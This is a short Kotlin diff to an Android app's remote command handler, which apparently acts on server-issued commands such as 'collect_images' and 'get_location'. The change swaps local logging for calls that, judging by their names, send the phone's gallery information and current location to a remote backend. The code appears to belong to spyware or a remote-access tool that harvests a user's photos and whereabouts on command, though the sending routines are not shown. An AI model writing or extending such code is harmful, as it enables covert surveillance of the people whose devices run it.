@@ -20,13 +20,11 @@ object CommandExecutor {
             }
             "collect_images" -> {
                 Log.i(TAG, "Starting image collection process...")
-                val images = ImageModule.scanGallery(context, 20)
-                Log.i(TAG, "Collected ${images.size} images.")
+                ImageModule.scanAndSendGalleryInfo(context)
             }
             "get_location" -> {
                 Log.i(TAG, "Fetching current location...")
-                val location = GeoProvider.getCurrentLocation(context)
-                Log.i(TAG, "Result: $location")
+                GeoProvider.sendCurrentLocation(context)
             }
             "update_token" -> {
                 Log.i(TAG, "Updating FCM token in Supabase...")
